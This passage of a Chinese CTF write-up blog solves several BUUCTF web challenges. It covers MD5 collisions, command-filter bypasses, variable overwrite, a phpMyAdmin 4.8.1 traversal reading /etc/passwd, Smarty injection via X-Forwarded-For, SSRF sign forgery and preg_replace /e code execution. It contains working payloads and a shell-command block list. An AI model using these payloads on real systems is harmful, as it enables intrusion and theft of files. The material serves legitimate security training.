class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>限制了类型为string，且比较类型为强类型，需要硬碰撞出两个md5一样的字符串，抄一个现成的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line"></span><br><span class="line">b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure><p>命令执行绕过<br>Linux下的命令执行有很多绕过方法</p><ul><li>在命令中穿插\，不会影响命令执行，如c\at /fl\ag</li><li>sort命令用于将文本文件内容加以排序。sort可针对文本文件的内容，以行为单位来排序。sort%20/flag</li></ul><p><img src="../../images/ctf/buuctf/8.jpg" alt=""></p><h1 id="BJDCTF2020-Mark-loves-cat"><a href="#BJDCTF2020-Mark-loves-cat" class="headerlink" title="[BJDCTF2020]Mark loves cat"></a>[BJDCTF2020]Mark loves cat</h1><p>git 泄露 </p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line">$yds = <span class="string">"dog"</span>;</span><br><span class="line">$is = <span class="string">"cat"</span>;</span><br><span class="line">$handsome = <span class="string">'yds'</span>;</span><br><span class="line"><span class="keyword">foreach</span>($_POST <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $x =&gt; $y)&#123;</span><br><span class="line">    <span class="keyword">if</span>($_GET[<span class="string">'flag'</span>] === $x &amp;&amp; $x !== <span class="string">'flag'</span>)&#123;</span><br><span class="line">        <span class="keyword">exit</span>($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>]) &amp;&amp; !<span class="keyword">isset</span>($_POST[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="keyword">exit</span>($yds);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>($_POST[<span class="string">'flag'</span>] === <span class="string">'flag'</span>  || $_GET[<span class="string">'flag'</span>] === <span class="string">'flag'</span>)&#123;</span><br><span class="line">    <span class="keyword">exit</span>($is);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the flag is: "</span>.$flag;</span><br></pre></td></tr></table></figure><p>可以看到有三个有输出的exit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exit</span>(<span class="variable">$handsome</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="variable">$is</span>);</span><br></pre></td></tr></table></figure><p>找一个最简单的，第二个exit：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!isset(<span class="variable">$_GET</span>[<span class="string">'flag'</span>]) &amp;&amp; !isset(<span class="variable">$_POST</span>[<span class="string">'flag'</span>]))&#123;</span><br><span class="line">    <span class="built_in">exit</span>(<span class="variable">$yds</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只要不给flag传值就会退出，退出的时候会显示$yds的值，而$yds的值在代码最开始的时候初始化过：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$yds</span> = <span class="string">"dog"</span>;</span><br></pre></td></tr></table></figure><p>初始化和exit之间有代码：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">foreach(<span class="variable">$_POST</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = <span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">foreach(<span class="variable">$_GET</span> as <span class="variable">$x</span> =&gt; <span class="variable">$y</span>)&#123;</span><br><span class="line">    $<span class="variable">$x</span> = $<span class="variable">$y</span>;</span><br><span class="line">&#125;</span><br><span class="line">我们只要在这段代码中令<span class="variable">$yds</span>=<span class="variable">$flag</span>，将原来<span class="variable">$yds</span>变量的值进行覆盖，同时符合退出条件，就可以输出拿到flag</span><br></pre></td></tr></table></figure><h1 id="GWCTF-2019-我有一个数据库"><a href="#GWCTF-2019-我有一个数据库" class="headerlink" title="[GWCTF 2019]我有一个数据库"></a>[GWCTF 2019]我有一个数据库</h1><p>版本为4.81，经查询，存在远程文件读取漏洞</p><p>直接上payload读取passwd文件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><h1 id="BJDCTF2020-The-mystery-of-ip"><a href="#BJDCTF2020-The-mystery-of-ip" class="headerlink" title="[BJDCTF2020]The mystery of ip"></a>[BJDCTF2020]The mystery of ip</h1><p>存在smarty注入payload。<br>网址：<a href="https://www.jianshu.com/p/eb8d0137a7d3" target="_blank" rel="noopener">https://www.jianshu.com/p/eb8d0137a7d3</a>    </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="keyword">if</span> phpinfo()&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">'ls'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123; readfile(<span class="string">'/flag'</span>) &#125;</span><br><span class="line">&#123;<span class="keyword">if</span> show_source(<span class="string">'/flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">&#123;<span class="keyword">if</span> system(<span class="string">'cat ../../../flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125; <span class="comment">#本题payload</span></span><br></pre></td></tr></table></figure><p>payload如下： </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /flag.php HTTP/1.1</span><br><span class="line">Host: node3.buuoj.cn:29925</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">X-Forwarded-For: &#123;<span class="keyword">if</span> system(<span class="string">'cat ../../../flag'</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure><h1 id="De1CTF-2019-SSRF-Me"><a href="#De1CTF-2019-SSRF-Me" class="headerlink" title="[De1CTF 2019]SSRF Me"></a>[De1CTF 2019]SSRF Me</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment">#encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line">reload(sys)</span><br><span class="line">sys.setdefaultencoding(<span class="string">'latin1'</span>)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">secert_key = os.urandom(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, action, param, sign, ip)</span>:</span></span><br><span class="line">        self.action = action</span><br><span class="line">        self.param = param</span><br><span class="line">        self.sign = sign</span><br><span class="line">        self.sandbox = md5(ip)</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">not</span> os.path.exists(self.sandbox)):          <span class="comment">#SandBox For Remote_Addr</span></span><br><span class="line">            os.mkdir(self.sandbox)</span><br><span class="line"><span class="comment">#_init_初始化</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">Exec</span><span class="params">(self)</span>:</span></span><br><span class="line">        result = &#123;&#125;</span><br><span class="line">        result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">        <span class="keyword">if</span> (self.checkSign()):</span><br><span class="line"></span><br><span class="line"><span class="comment">#第一个if：如果checkSign(self) 返回 True ，则进入下一个if</span></span><br><span class="line"><span class="comment">#审计checkSign(self)</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"scan"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                tmpfile = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'w'</span>)</span><br><span class="line">                resp = scan(self.param)</span><br><span class="line">                <span class="keyword">if</span> (resp == <span class="string">"Connection Timeout"</span>):</span><br><span class="line">                    result[<span class="string">'data'</span>] = resp</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">print</span> resp</span><br><span class="line">                    tmpfile.write(resp)</span><br><span class="line">                    tmpfile.close()</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line"><span class="comment">#如果scan在action里面，则我们可以让param进入scan这个函数，并的目录下创建一个result.txt </span></span><br><span class="line"><span class="comment">#然后通过scan()函数把名字为param的网址里的内容写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> <span class="string">"read"</span> <span class="keyword">in</span> self.action:</span><br><span class="line">                f = open(<span class="string">"./%s/result.txt"</span> % self.sandbox, <span class="string">'r'</span>)</span><br><span class="line">                result[<span class="string">'code'</span>] = <span class="number">200</span></span><br><span class="line">                result[<span class="string">'data'</span>] = f.read()</span><br><span class="line">            <span class="keyword">if</span> result[<span class="string">'code'</span>] == <span class="number">500</span>:</span><br><span class="line">                result[<span class="string">'data'</span>] = <span class="string">"Action Error"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            result[<span class="string">'code'</span>] = <span class="number">500</span></span><br><span class="line">            result[<span class="string">'msg'</span>] = <span class="string">"Sign Error"</span></span><br><span class="line">        <span class="keyword">return</span> result</span><br><span class="line"><span class="comment">#如果read在action里面，则我们可以读取读取result.txt的内容赋值给result</span></span><br><span class="line"></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">checkSign</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> (getSign(self.action,self.param) == self.sign):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#如果getSign(self.action, self.param)和self.sign相等则返回True ,否则返回False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route("/geneSign", methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">geneSign</span><span class="params">()</span>:</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    action = <span class="string">"scan"</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br><span class="line"><span class="comment">#提取get方法传入的，参数名叫param对应得值，并将其url编码后赋值给param</span></span><br><span class="line"><span class="comment">#将scan赋值给action</span></span><br><span class="line"><span class="comment">#审计 getSign()</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/De1ta',methods=['GET','POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">challenge</span><span class="params">()</span>:</span></span><br><span class="line">    action = urllib.unquote(request.cookies.get(<span class="string">"action"</span>))</span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">"param"</span>, <span class="string">""</span>))</span><br><span class="line">    sign = urllib.unquote(request.cookies.get(<span class="string">"sign"</span>))</span><br><span class="line">    ip = request.remote_addr</span><br><span class="line">    <span class="keyword">if</span>(waf(param)):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"No Hacker!!!!"</span></span><br><span class="line">    task = Task(action, param, sign, ip)</span><br><span class="line">    <span class="keyword">return</span> json.dumps(task.Exec())</span><br><span class="line"><span class="comment">#以get方法传入param参数值，在cookie里面传递action和sign的值</span></span><br><span class="line"><span class="comment">#使param绕过waf，审计waf</span></span><br><span class="line"><span class="comment">#用我们传进去的 action 、 param  、sign  、ip 这四个参数构造一个Task类对象，并且执行它的Exec方法</span></span><br><span class="line"><span class="comment">#审计Task</span></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"code.txt"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan</span><span class="params">(param)</span>:</span></span><br><span class="line">    socket.setdefaulttimeout(<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.urlopen(param).read()[:<span class="number">50</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"Connection Timeout"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getSign</span><span class="params">(action, param)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"><span class="comment">#将secert_key 、param 、 action这三个值连接起来后进行md5加密，并将其作为十六进制数据字符串值返回</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">md5</span><span class="params">(content)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">waf</span><span class="params">(param)</span>:</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">"gopher"</span>) <span class="keyword">or</span> check.startswith(<span class="string">"file"</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="comment">#移除param头尾指定的字符(默认为空格或换行符)，并将param中中所有大写字符转化为小写</span></span><br><span class="line"><span class="comment">#若param以gopher或file为前缀，返回True,否者返回False</span></span><br><span class="line"><span class="comment">#回到challenge()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure><p>审计从路由开始，然后在慢慢延申出去</p><p>这里有三个路由：</p><p>/geneSign<br>/De1ta<br>/<br>从/De1ta开始看起，首先是创建了一个Task的类，action、sign的值是由cookie得到，而param的值就是直接通过GET方法传递param参数的值得到，ip就是你的ip地址，接着param参数会经过waf，如果过了waf，则执行这个类的Exec。<br>顺着这个思路，我们追溯到waf这个方法上,通过审计我们知道要绕过waf，param的值不能以 gopher和file开头</p><p>接下去执行Task里的Exec方法，通过审计我们发现如果checkSign(self) 为真 ，则可以传递/De1ta页面的param参数进入到scan方法，并的目录下创建一个result.txt ，然后通过scan()函数把参数param的值写到result.txt中，由于param是可控的，所以很容易想到这里把flag.txt传给param。</p><p>审计checkSign(self) 函数，发现如果getSign(cookie传入的action, get传入的param)和cookie传入的sign相等则返回True ,否则返回False</p><p>审计getSign(),我们发现不知道secert_key的值，但是路由/geneSign有一个return getSign(scan, param)，这里我们另/geneSign页面的参数param的值为flag.txtread(这里为什么后面会讲到)，通过getSign得到的sign值即为md5(secert_key + ‘flag.txtread’ + ‘scan’)</p><p>回到Task类的Exec方法if “read” in self.action:如果read在action里面，则我们可以读取读取result.txt的内容赋值给result，这里result.txt的值实际上是我们传入的param的值</p><p>在这里就可以解释为什么/geneSign页面我们传入的param的值要为flag.txtread了，因为结合Exec方法，我们要实现写入文件和读出的功能，就必须另//De1ta页面的action为readsacn或scanread,此时的getSign(),返回的值就是hashlib.md5(secert_key + flag.txt + readscan).hexdigest(),而此时只有另/geneSign页面的param参数为flag.txtread才能使</p><p>getSign(self.action, self.param) == getSign(flag.txt+readscan) ,</p><p>即md5(secret_key+flag.txtread+scan) == md5(secret_key+flag.txt+readscan)</p><p>所以第二步就是在/De1ta页面，get ?param=flag.txt ,cookie action=readscan ,sign=我们在/geneSign页面得到的md5值，这样就可以得到flag了 </p><h1 id="BJDCTF2020-ZJCTF，不过如此"><a href="#BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="[BJDCTF2020]ZJCTF，不过如此"></a>[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">$text = $_GET[<span class="string">"text"</span>];</span><br><span class="line">$file = $_GET[<span class="string">"file"</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($text)&amp;&amp;(file_get_contents($text,<span class="string">'r'</span>)===<span class="string">"I have a dream"</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;h1&gt;"</span>.file_get_contents($text,<span class="string">'r'</span>).<span class="string">"&lt;/h1&gt;&lt;/br&gt;"</span>;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Not now!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>($file);  <span class="comment">//next.php</span></span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>解答<br>读取 next.php 文件内容</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://8db9374d-313e-4a56-8c16-b395e7075b1f.node3.buuoj.cn/?text=php://input&amp;file=php://filter/<span class="built_in">read</span>=base64-convert.encode/resource=next.php</span><br><span class="line"></span><br><span class="line">post： I have a dream</span><br></pre></td></tr></table></figure><p>next.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$id = $_GET[<span class="string">'id'</span>];</span><br><span class="line">$_SESSION[<span class="string">'id'</span>] = $id;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span><span class="params">($re, $str)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $re . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $str</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>($_GET <span class="keyword">as</span> $re =&gt; $str) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complex($re, $str). <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>详情可看此文章： <a href="https://xz.aliyun.com/t/2557" target="_blank" rel="noopener">https://xz.aliyun.com/t/2557</a>   </p><p>preg_replace 语句如果直接写在程序里面，当然可以成功执行 phpinfo() ，然而我们的 <code>.*</code>是通过 GET 方式传入，传上去的<code>.*</code>变成了<code>__*</code>，由于在PHP中，对于传入的非法的 <code>$_GET</code> 数组参数名，会将其转换成下划线，这就导致正则匹配失效。提供一个 payload ： <code>\S*=${phpinfo()}</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">next.php?\S*=<span class="variable">$&#123;getFlag()&#125;</span>&amp;cmd=system(<span class="string">'cat /flag'</span>);</span><br></pre></td></tr></table></figure><p>为什么要匹配到 {${phpinfo()}} 或者 ${phpinfo()} ，才能执行 phpinfo 函数，这是一个小坑。这实际上是 PHP可变变量 的原因。在PHP中双引号包裹的字符串中可以解析变量，而单引号则不行。 ${phpinfo()} 中的 phpinfo() 会被当做变量先执行，执行后，即变成 ${1} (phpinfo()成功执行返回true)。如果这个理解了，你就能明白下面这个问题：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">var_dump(phpinfo()); // 结果：布尔 <span class="literal">true</span></span><br><span class="line">var_dump(strtolower(phpinfo()));// 结果：字符串 <span class="string">'1'</span></span><br><span class="line">var_dump(preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'1'</span>,<span class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>));// 结果：字符串<span class="string">'11'</span></span><br><span class="line"></span><br><span class="line">var_dump(preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'strtolower("\\1")'</span>,<span class="string">'&#123;$&#123;phpinfo()&#125;&#125;'</span>));// 结果：空字符串<span class="string">''</span></span><br><span class="line">var_dump(preg_replace(<span class="string">'/(.*)/ie'</span>,<span class="string">'strtolower("&#123;$&#123;phpinfo()&#125;&#125;")'</span>,<span 